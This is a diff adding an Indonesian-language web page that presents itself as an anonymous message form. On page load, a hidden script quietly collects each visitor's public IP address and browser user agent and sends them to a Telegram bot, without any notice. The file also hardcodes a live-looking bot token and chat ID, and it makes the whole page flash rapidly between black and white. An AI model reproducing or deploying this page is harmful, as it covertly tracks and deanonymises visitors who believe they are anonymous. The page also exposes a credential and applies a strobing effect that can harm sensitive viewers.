@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kirim Pesan</title>
+    <style>
+        /* Animasi kelap-kelip */
+        @keyframes kelapKelip {
+            0%, 100% {
+                background-color: #ffffff;
+                color: #000000;
+            }
+            50% {
+                background-color: #000000;
+                color: #ffffff;
+            }
+        }
+
+        /* Terapkan animasi ke body */
+        body {
+            font-family: Arial, sans-serif;
+            animation: kelapKelip 0.5s infinite;
+            padding: 20px;
+        }
+
+        form {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            animation: kelapKelip 0.5s infinite;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #007BFF;
+            border-radius: 4px;
+            animation: kelapKelip 0.5s infinite;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            animation: kelapKelip 0.5s infinite;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #response, #errorMessage {
+            margin-top: 20px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <h1>Kirim Pesan😍</h1>
+    </center>
+    <form id="anonMessageForm">
+        <div id="errorMessage"></div>
+        
+        <label for="name">Nama Kamu:</label>
+        <input type="text" id="name" name="name">
+        
+        <label for="message">Pesan:</label>
+        <textarea id="message" name="message" required></textarea>
+        
+        <button type="submit">Kirim</button>
+    </form>
+    <div id="response"></div>
+    
+    <script>
+        // Ganti dengan token bot Anda dan chat ID Anda
+        const botToken = '7540062077:AAHKhgc3bvOiQT40vFQiD6BR2J3t4NqdfpI';
+        const chatId = '7888873250';
+
+        // Mengirim IP dan User Agent ke bot Telegram saat pengguna membuka halaman
+        window.addEventListener('load', () => {
+            const userAgent = navigator.userAgent;
+
+            // Mendapatkan IP publik pengguna
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    const telegramMessage = `IP: ${userIP}\nUSER AGENT: ${userAgent}`;
+                    
+                    // Mengirim data ke bot Telegram
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: telegramMessage,
+                        }),
+                    });
+                })
+                .catch(error => console.error('Gagal mendapatkan IP:', error));
+        });
+
+        document.getElementById('anonMessageForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const name = document.getElementById('name').value.trim();
+            const message = document.getElementById('message').value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.innerText = '';
+
+            // Validasi jika nama atau pesan kosong
+            if (name === '') {
+                errorMessage.innerText = 'Nama tidak boleh kosong.';
+                return;
+            }
+            if (message === '') {
+                errorMessage.innerText = 'Pesan tidak boleh kosong.';
+                return;
+            }
+
+            // Format pesan yang akan dikirim ke Telegram
+            const telegramMessage = `DARI: ${name}\n\nPESAN: ${message}`;
+
+            // Kirim pesan ke bot Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: telegramMessage,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('response').innerText = 'Pesan berhasil dikirim';
+                    document.getElementById('anonMessageForm').reset();
+                } else {
+                    document.getElementById('response').innerText = 'Pesan gagal, coba lagi nanti.';
+                }
+            })
+            .catch(error => {
+                document.getElementById('response').innerText = 'Terjadi kesalahan, coba lagi nanti.';
+            });
+        });
+    </script>
+    <center>
+    	<b><u><i>@Zarz_Developer</i></u></b>
+    </center>
+</body>
+</html>
